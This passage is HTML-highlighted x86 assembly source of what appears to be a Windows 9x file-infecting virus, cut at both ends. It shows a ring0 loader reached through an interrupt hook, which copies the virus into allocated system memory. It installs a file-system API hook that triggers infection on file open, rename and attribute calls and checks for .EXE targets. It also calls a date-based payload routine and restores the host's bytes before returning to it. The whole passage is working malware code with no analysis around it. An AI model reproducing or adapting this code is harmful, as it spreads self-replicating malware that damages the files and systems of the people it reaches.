        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                          </span><span class="sc1">;high/low word</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc5">inthook</span><span class="sc0">                         </span><span class="sc1">;call int, int will be ring0!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">;Restore old interrupt values</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc5">RestoreSEH</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;pops offset pushed by CALL</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">imagebase</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;--- Restore old bytes ---;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;do at it ring0 to avoid</span><span class="sc0">
                                                </span><span class="sc1">;page errorz</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldbytes</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">JmpToCodesz</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">;restore bytes from host</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                         </span><span class="sc1">;--- return to host ---;</span><span class="sc0">
</span><span class="sc5">imagebase</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">0400000h</span><span class="sc0">       </span><span class="sc1">;1st gen</span><span class="sc0">
</span><span class="sc5">base</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ****    RING0 LOADER    ****</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">Inthandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bff70404h</span><span class="sc0">                  </span><span class="sc1">;already loaded?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">back2ring3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGEFIXED</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PAGEZEROINIT</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;PhysAddr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;maxPhys</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;minPhys</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Align</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;handle of VM = 0 if PG_SYS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PG_SYS</span><span class="sc0">                          </span><span class="sc1">;allocate memory in system area</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeInPages</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">;nPages</span><span class="sc0">
</span><span class="sc5">VxD1V</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010053h</span><span class="sc0">
</span><span class="sc5">VxD1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">PageAllocate</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;eax = place in mem</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">back2ring3</span><span class="sc0">                      </span><span class="sc1">;if zero error :(</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;set (e)destination</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;set source</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virusz</span><span class="sc0">                      </span><span class="sc1">;virussize</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                                     </span><span class="sc1">;you never know with poly :)</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;copy virus to allocated mem</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">delta</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hook</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Install FileSystem Hook</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">VxD2V</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">InstallFileSystemApiHook</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc5">IFSMgr</span><span class="sc0">
</span><span class="sc5">VxD2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr</span><span class="sc4">,</span><span class="sc5">InstallFileSystemApiHook</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">nexthook</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PC_STATIC</span><span class="sc0">                             
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">020060000h</span><span class="sc0">                      </span><span class="sc1">;new paging settings</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeInPages</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">VxD5V</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010133h</span><span class="sc0">
</span><span class="sc5">VxD5</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">PageModifyPermissions</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckThePayloadDate</span><span class="sc0">             </span><span class="sc1">;(and mayB do something:)</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep2</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc5">back2ring3</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">iretd</span><span class="sc0">                                   </span><span class="sc1">;exit int (to ring3!)</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">oldbytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">JmpToCodesz</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">176d</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ****    FILESYSTEM HOOK  ****</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">hook</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bfh</span><span class="sc0">                            </span><span class="sc1">;mov edi,DeltaInMem</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">busy</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc3">"BuSY"</span><span class="sc0">     </span><span class="sc1">;...are we busy?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">back</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">death</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'TRUE'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">back</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;EAX = Function</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IFSFN_OPEN</span><span class="sc0">              </span><span class="sc1">;File Open? try it</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IFSFN_RENAME</span><span class="sc0">            </span><span class="sc1">;Rename? try it</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">        </span><span class="sc1">;File Attributes? try it</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infect</span><span class="sc0">

</span><span class="sc5">back</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; call the old</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">nexthook</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">leave</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
        
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;       ****    SOME CHECKS BEFORE INFECTING    ****</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bff70400h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">stayalive</span><span class="sc0">                       </span><span class="sc1">;kill ourself?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">death</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc12">'TRUE'</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bff70400h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">stayalive</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">busy</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'BuSY'</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;file buffer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                         </span><span class="sc1">;no drive defined?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nopath</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">;a=1,b=2,a+40h='A',b+40h='B'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">nopath</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;push 0                   ;BCS/WANSI</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                              </span><span class="sc1">;ax=100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;push 100h                ;buf size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;filename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;destination (buffer)</span><span class="sc0">

</span><span class="sc5">VxD3V</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">UniToBCSPath</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc2">256</span><span class="sc4">*</span><span class="sc5">IFSMgr</span><span class="sc0">
</span><span class="sc5">VxD3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc0">            </span><span class="sc1">;Convert to ASCII</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">;restore stack</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;eax = lenght</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;make ASCIIZ</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">                  </span><span class="sc1">;normal exe?</span><span class="sc0">
